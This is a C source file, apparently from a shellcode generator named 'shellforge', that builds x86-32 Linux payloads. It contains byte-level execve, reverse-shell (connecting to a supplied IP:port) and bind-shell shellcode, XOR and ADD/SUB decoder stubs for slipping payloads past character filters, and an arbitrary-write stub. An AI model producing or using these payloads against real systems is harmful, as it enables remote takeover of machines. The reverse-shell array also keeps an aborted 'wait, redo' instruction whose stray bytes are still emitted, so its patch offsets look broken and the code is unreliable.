#include "shellforge.h"
#include <string.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <stdlib.h>

/* ─────────────────────────────────────────────
   x86-32 Linux Synthesiser
   Syscall ABI: int 0x80
     eax = syscall nr
     ebx, ecx, edx, esi, edi = args
   Socket ops via socketcall(102):
     ebx = call type (1=socket,2=bind,3=connect,
                      4=listen,5=accept)
     ecx = ptr to args array on stack
   ───────────────────────────────────────────── */

/* Forward declarations */
static void p_append(sf_result_t *r, const char *s);
static int  p_buf_append(uint8_t *dst, size_t *dlen, size_t dmax,
                         const uint8_t *src, size_t slen);

/* ── execve(/bin//sh) x86-32 — 21 bytes ──────
 *  xor  eax, eax
 *  push eax             ; null terminator
 *  push 0x68732f2f      ; "//sh"
 *  push 0x6e69622f      ; "/bin"
 *  mov  ebx, esp        ; ebx = "/bin//sh"
 *  push eax             ; argv[1]=NULL
 *  push ebx             ; argv[0]=ptr
 *  mov  ecx, esp        ; ecx = argv
 *  cdq                  ; edx = 0 (envp)
 *  mov  al, 11          ; execve
 *  int  0x80
 */
static const uint8_t EXEC_X86_32[] = {
    0x31,0xc0,           /* xor eax,eax        */
    0x50,                /* push eax           */
    0x68,0x2f,0x2f,0x73,0x68, /* push "//sh"  */
    0x68,0x2f,0x62,0x69,0x6e, /* push "/bin"  */
    0x89,0xe3,           /* mov ebx,esp        */
    0x50,                /* push eax           */
    0x53,                /* push ebx           */
    0x89,0xe1,           /* mov ecx,esp        */
    0x99,                /* cdq                */
    0xb0,0x0b,           /* mov al,11          */
    0xcd,0x80            /* int 0x80           */
};

/* ── socketcall helper bytes ─────────────────
 * socketcall(call_type, &args_on_stack):
 *   mov  al, 102       ; socketcall
 *   mov  bl, <type>    ; call type
 *   lea  ecx,[esp]     ; ptr to args
 *   int  0x80
 */

/* Reverse shell: connect-back
 * socket(AF_INET,SOCK_STREAM,0) via socketcall
 * connect(fd,&sa,16)
 * dup2(fd,2/1/0)
 * execve
 *
 * Port patched at RS32_PORT_OFF
 * IP   patched at RS32_IP_OFF
 */
#define RS32_PORT_OFF  43
#define RS32_IP_OFF    47

static const uint8_t REVSHELL_X86_32[] = {
    /* socketcall(SYS_SOCKET=1, [AF_INET,SOCK_STREAM,0]) */
    0x31,0xdb,           /* xor ebx,ebx        */
    0x31,0xc9,           /* xor ecx,ecx        */
    0x31,0xd2,           /* xor edx,edx        */
    0x31,0xc0,           /* xor eax,eax        */
    0x53,                /* push 0 (proto)     */
    0x41,                /* inc ecx (SOCK_STREAM=1) */
    0x51,                /* push ecx           */
    0x6a,0x02,           /* push 2 (AF_INET)   */
    0x89,0xe1,           /* mov ecx,esp        */
    0xb3,0x01,           /* mov bl,1 (SOCKET)  */
    0xb0,0x66,           /* mov al,102         */
    0xcd,0x80,           /* int 0x80           */
    0x89,0xc7,           /* mov edi,eax (fd)   */

    /* build sockaddr on stack */
    0x31,0xc0,           /* xor eax,eax        */
    0x50,                /* push 0 (pad)       */
    0x68,0x00,0x00,0x00,0x00, /* push ip [47] */
    0x66,0x68,0x00,0x00, /* pushw port  [43]   */
    0x66,0x6a,0x02,      /* pushw AF_INET      */
    0x89,0xe1,           /* mov ecx,esp (&sa)  */

    /* socketcall(SYS_CONNECT=3,[fd,&sa,16]) */
    0x57,                /* push edi (fd)      */
    0x51,                /* push ecx (&sa)     */
    0x6a,0x10,           /* push 16            */
    0x89,0xe1,           /* mov ecx,esp        */
    0xb3,0x03,           /* mov bl,3 (CONNECT) */
    0xb0,0x66,           /* mov al,102         */
    0xcd,0x80,           /* int 0x80           */

    /* dup2(fd,2), dup2(fd,1), dup2(fd,0) */
    0xb3,0x02,           /* mov bl,2           */
    0x89,0xfb,           /* mov ebx... wait, use edi for fd */
    /* redo: ebx=fd, ecx=fd_num */
    0x89,0xfb,           /* mov ebx,edi (fd)   */
    0x31,0xc9,           /* xor ecx,ecx        */
    0xb1,0x02,           /* mov cl,2           */
    0xb0,0x3f,           /* mov al,63 (dup2)   */
    0xcd,0x80,           /* int 0x80           */
    0xb1,0x01,           /* mov cl,1           */
    0xb0,0x3f,
    0xcd,0x80,
    0xb1,0x00,           /* mov cl,0           */
    0xb0,0x3f,
    0xcd,0x80,

    /* execve */
    0x31,0xc0,
    0x50,
    0x68,0x2f,0x2f,0x73,0x68,
    0x68,0x2f,0x62,0x69,0x6e,
    0x89,0xe3,
    0x50,0x53,
    0x89,0xe1,
    0x99,
    0xb0,0x0b,
    0xcd,0x80
};

/* Bind shell x86-32 */
#define BS32_PORT_OFF  42

static const uint8_t BINDSHELL_X86_32[] = {
    /* socket(AF_INET,SOCK_STREAM,0) */
    0x31,0xdb,0x31,0xc9,0x31,0xd2,0x31,0xc0,
    0x53, 0x41, 0x51, 0x6a,0x02,
    0x89,0xe1, 0xb3,0x01, 0xb0,0x66, 0xcd,0x80,
    0x89,0xc3,           /* mov ebx,eax (fd)   */

    /* sockaddr: family=2,port,0.0.0.0 */
    0x31,0xc0, 0x50, 0x50,
    0x66,0x68,0x00,0x00, /* pushw port [42]    */
    0x66,0x6a,0x02,
    0x89,0xe1,           /* ecx=&sa            */

    /* bind(fd,&sa,16) */
    0x53,0x51,0x6a,0x10, 0x89,0xe1,
    0xb3,0x02, 0xb0,0x66, 0xcd,0x80,

    /* listen(fd,1) */
    0x53,0x6a,0x01, 0x89,0xe1,
    0xb3,0x04, 0xb0,0x66, 0xcd,0x80,

    /* accept(fd,0,0) */
    0x31,0xc9, 0x31,0xd2,
    0x53, 0x51, 0x52,
    0x89,0xe1,
    0xb3,0x05, 0xb0,0x66, 0xcd,0x80,
    0x89,0xc3,           /* clientfd → ebx     */

    /* dup2 x3 */
    0x31,0xc9,
    0xb1,0x02, 0xb0,0x3f, 0xcd,0x80,
    0xb1,0x01, 0xb0,0x3f, 0xcd,0x80,
    0xb1,0x00, 0xb0,0x3f, 0xcd,0x80,

    /* execve */
    0x31,0xc0, 0x50,
    0x68,0x2f,0x2f,0x73,0x68,
    0x68,0x2f,0x62,0x69,0x6e,
    0x89,0xe3, 0x50,0x53,
    0x89,0xe1, 0x99,
    0xb0,0x0b, 0xcd,0x80
};

/* ── XOR decoder stub for x86-32 ─────────────
 * jmp short fwd
 * pop esi          ; esi = &payload[0]
 * push esi         ; save start
 * pop ebx          ; ebx = start
 * xor ecx,ecx
 * mov cl,<LEN>     [8]
 * xor [esi],<KEY>  [11]
 * inc esi
 * loop -5
 * jmp ebx
 * call -0x15+2
 */
#define X86_32_XOR_STUB_LEN  23
#define X86_32_XOR_LEN_OFF    8
#define X86_32_XOR_KEY_OFF   11

static const uint8_t X86_32_XOR_STUB[X86_32_XOR_STUB_LEN] = {
    0xeb,0x10,       /* [0]  jmp +18 → call     */
    0x5e,            /* [2]  pop esi             */
    0x56,            /* [3]  push esi            */
    0x5b,            /* [4]  pop ebx             */
    0x31,0xc9,       /* [5]  xor ecx,ecx         */
    0xb1,0x00,       /* [7]  mov cl,<LEN>  [8]   */
    0x80,0x36,0x00,  /* [9]  xor[esi],<KEY>[11]  */
    0x46,            /* [12] inc esi             */
    0xe2,0xf9,       /* [13] loop [9]            */
    0xff,0xe3,       /* [15] jmp ebx             */
    0xe8,0xeb,0xff,0xff,0xff /* [17] call -0x15+2 */
};

/* ── ADD/SUB decoder stub for x86-32 ─────────*/
#define X86_32_ADDSUB_STUB_LEN  23
#define X86_32_ADDSUB_LEN_OFF    8
#define X86_32_ADDSUB_KEY_OFF   11

static const uint8_t X86_32_ADDSUB_STUB[X86_32_ADDSUB_STUB_LEN] = {
    0xeb,0x10,
    0x5e,
    0x56,
    0x5b,
    0x31,0xc9,
    0xb1,0x00,       /* [8]  LEN */
    0x80,0x06,0x00,  /* [9]  add [esi],KEY [11] */
    0x46,            /* [12] inc esi            */
    0xe2,0xf9,       /* [13] loop               */
    0xff,0xe3,       /* [15] jmp ebx            */
    0xe8,0xeb,0xff,0xff,0xff
};

/* ── Helpers ─────────────────────────────────*/
static void p_append(sf_result_t *r, const char *s) {
    size_t rem = sizeof(r->disasm) - strlen(r->disasm) - 1;
    strncat(r->disasm, s, rem);
}

static int p_buf_append(uint8_t *dst, size_t *dlen, size_t dmax,
                        const uint8_t *src, size_t slen) {
    if (*dlen + slen > dmax) return -1;
    memcpy(dst + *dlen, src, slen);
    *dlen += slen;
    return 0;
}

/* ── Encoder helpers ─────────────────────────*/
static sf_status_t x86_32_encode_xor(sf_result_t *r, const sf_constraints_t *c) {
    if (r->payload_len > 255) return SF_ERR_ENCODE_FAIL;
    uint8_t orig[SF_MAX_PAYLOAD];
    size_t  olen = r->payload_len;
    memcpy(orig, r->payload, olen);

    for (int key=1; key<=0xff; key++) {
        uint8_t enc[SF_MAX_PAYLOAD]; int ok=1;
        for (size_t i=0;i<olen;i++) {
            enc[i]=orig[i]^(uint8_t)key;
            if (sf_is_bad_char(c,enc[i])){ok=0;break;}
        }
        if (!ok) continue;
        if (sf_is_bad_char(c,(uint8_t)key)) continue;

        uint8_t stub[X86_32_XOR_STUB_LEN];
        memcpy(stub,X86_32_XOR_STUB,X86_32_XOR_STUB_LEN);
        stub[X86_32_XOR_LEN_OFF]=(uint8_t)olen;
        stub[X86_32_XOR_KEY_OFF]=(uint8_t)key;
        if (!sf_buffer_clean(c,stub,X86_32_XOR_STUB_LEN)) continue;

        uint8_t full[SF_MAX_PAYLOAD]; size_t flen=0;
        if (p_buf_append(full,&flen,SF_MAX_PAYLOAD,stub,X86_32_XOR_STUB_LEN)!=0) continue;
        if (p_buf_append(full,&flen,SF_MAX_PAYLOAD,enc,olen)!=0) continue;
        memcpy(r->payload,full,flen); r->payload_len=flen;

        char note[256];
        snprintf(note,sizeof(note),"; x86-32 XOR stub key=0x%02x len=%zu\n",key,olen);
        char saved[sizeof(r->disasm)];
        strncpy(saved,r->disasm,sizeof(saved)-1); saved[sizeof(saved)-1]='\0';
        memset(r->disasm,0,sizeof(r->disasm));
        p_append(r,note); p_append(r,saved);
        return SF_OK;
    }
    return SF_ERR_ENCODE_FAIL;
}

static sf_status_t x86_32_encode_add_sub(sf_result_t *r, const sf_constraints_t *c) {
    if (r->payload_len > 255) return SF_ERR_ENCODE_FAIL;
    uint8_t orig[SF_MAX_PAYLOAD];
    size_t  olen = r->payload_len;
    memcpy(orig, r->payload, olen);

    for (int delta=1; delta<=0xff; delta++) {
        uint8_t enc[SF_MAX_PAYLOAD]; int ok=1;
        for (size_t i=0;i<olen;i++) {
            enc[i]=(uint8_t)((orig[i]-delta)&0xff);
            if (sf_is_bad_char(c,enc[i])){ok=0;break;}
        }
        if (!ok) continue;
        if (sf_is_bad_char(c,(uint8_t)delta)) continue;

        uint8_t stub[X86_32_ADDSUB_STUB_LEN];
        memcpy(stub,X86_32_ADDSUB_STUB,X86_32_ADDSUB_STUB_LEN);
        stub[X86_32_ADDSUB_LEN_OFF]=(uint8_t)olen;
        stub[X86_32_ADDSUB_KEY_OFF]=(uint8_t)delta;
        if (!sf_buffer_clean(c,stub,X86_32_ADDSUB_STUB_LEN)) continue;

        uint8_t full[SF_MAX_PAYLOAD]; size_t flen=0;
        if (p_buf_append(full,&flen,SF_MAX_PAYLOAD,stub,X86_32_ADDSUB_STUB_LEN)!=0) continue;
        if (p_buf_append(full,&flen,SF_MAX_PAYLOAD,enc,olen)!=0) continue;
        memcpy(r->payload,full,flen); r->payload_len=flen;

        char note[256];
        snprintf(note,sizeof(note),"; x86-32 ADD/SUB stub delta=0x%02x len=%zu\n",delta,olen);
        char saved[sizeof(r->disasm)];
        strncpy(saved,r->disasm,sizeof(saved)-1); saved[sizeof(saved)-1]='\0';
        memset(r->disasm,0,sizeof(r->disasm));
        p_append(r,note); p_append(r,saved);
        r->encoding_used = ENC_ADD_SUB;
        return SF_OK;
    }
    return SF_ERR_ENCODE_FAIL;
}

/* ── Public synthesiser entry point ──────────*/
sf_status_t sf_synth_x86_32_linux(const sf_constraints_t *c, sf_result_t *r) {
    switch (c->goal) {

        case GOAL_EXEC_SHELL:
            memcpy(r->payload,EXEC_X86_32,sizeof(EXEC_X86_32));
            r->payload_len=sizeof(EXEC_X86_32);
            p_append(r,"; x86-32 execve(/bin//sh)\n"
                "xor eax,eax\npush eax\npush '//sh'\npush '/bin'\n"
                "mov ebx,esp\npush eax\npush ebx\n"
                "mov ecx,esp\ncdq\nmov al,11\nint 0x80\n");
            break;

        case GOAL_REVERSE_SHELL: {
            uint32_t ip=0; uint16_t port=0;
            if (c->goal_args.argc<1) return SF_ERR_INVALID_ARG;
            /* parse host:port */
            char arg[SF_MAX_ARG_LEN];
            strncpy(arg,(const char*)c->goal_args.args[0],SF_MAX_ARG_LEN-1);
            char *colon=strrchr(arg,':');
            if (!colon) return SF_ERR_INVALID_ARG;
            *colon='\0';
            int pnum=atoi(colon+1);
            if (pnum<=0||pnum>65535) return SF_ERR_INVALID_ARG;
            struct in_addr addr;
            if (inet_pton(AF_INET,arg,&addr)!=1) return SF_ERR_INVALID_ARG;
            ip=addr.s_addr; port=htons((uint16_t)pnum);

            memcpy(r->payload,REVSHELL_X86_32,sizeof(REVSHELL_X86_32));
            r->payload[RS32_PORT_OFF]  =port&0xff;
            r->payload[RS32_PORT_OFF+1]=(port>>8)&0xff;
            memcpy(&r->payload[RS32_IP_OFF],&ip,4);
            r->payload_len=sizeof(REVSHELL_X86_32);
            uint8_t *p=(uint8_t*)&ip;
            char d[128];
            snprintf(d,sizeof(d),"; x86-32 reverse shell → %u.%u.%u.%u:%u\n",
                     p[0],p[1],p[2],p[3],ntohs(port));
            p_append(r,d);
            break;
        }

        case GOAL_BIND_SHELL: {
            if (c->goal_args.argc<1) return SF_ERR_INVALID_ARG;
            int pnum=atoi((const char*)c->goal_args.args[0]);
            if (pnum<=0||pnum>65535) return SF_ERR_INVALID_ARG;
            uint16_t port=htons((uint16_t)pnum);

            memcpy(r->payload,BINDSHELL_X86_32,sizeof(BINDSHELL_X86_32));
            r->payload[BS32_PORT_OFF]  =port&0xff;
            r->payload[BS32_PORT_OFF+1]=(port>>8)&0xff;
            r->payload_len=sizeof(BINDSHELL_X86_32);
            char d[64];
            snprintf(d,sizeof(d),"; x86-32 bind shell port %u\n",(uint16_t)pnum);
            p_append(r,d);
            break;
        }

        case GOAL_ARBITRARY_WRITE: {
            if (c->goal_args.argc<2) return SF_ERR_INVALID_ARG;
            /* 32-bit write: mov eax,val; mov ebx,addr; mov [ebx],eax; ret */
            uint32_t addr =(uint32_t)strtoul((const char*)c->goal_args.args[0],NULL,0);
            uint32_t value=(uint32_t)strtoul((const char*)c->goal_args.args[1],NULL,0);
            uint8_t sc[14]; size_t pos=0;
            sc[pos++]=0xb8; memcpy(sc+pos,&value,4); pos+=4; /* mov eax,imm32 */
            sc[pos++]=0xbb; memcpy(sc+pos,&addr, 4); pos+=4; /* mov ebx,imm32 */
            sc[pos++]=0x89; sc[pos++]=0x03;                   /* mov [ebx],eax */
            sc[pos++]=0xc3;                                    /* ret           */
            memcpy(r->payload,sc,pos); r->payload_len=pos;
            char d[128];
            snprintf(d,sizeof(d),"; x86-32 arb write *0x%x = 0x%x\n",addr,value);
            p_append(r,d);
            break;
        }

        default:
            snprintf(r->error_msg,sizeof(r->error_msg),"Goal not supported for x86-32");
            return SF_ERR_UNSUPPORTED;
    }

    /* Bad char check + encoding */
    if (!sf_buffer_clean(c,r->payload,r->payload_len)) {
        sf_encoding_t enc=c->encoding;
        sf_status_t es=SF_ERR_ENCODE_FAIL;
        if (enc==ENC_AUTO||enc==ENC_XOR)     es=x86_32_encode_xor(r,c);
        if (es!=SF_OK&&(enc==ENC_AUTO||enc==ENC_ADD_SUB)) es=x86_32_encode_add_sub(r,c);
        if (es!=SF_OK) { r->encoding_used=ENC_NONE; return es; }
        if (enc!=ENC_ADD_SUB) r->encoding_used=ENC_XOR;
    } else {
        r->encoding_used=ENC_NONE;
    }
    return SF_OK;
}
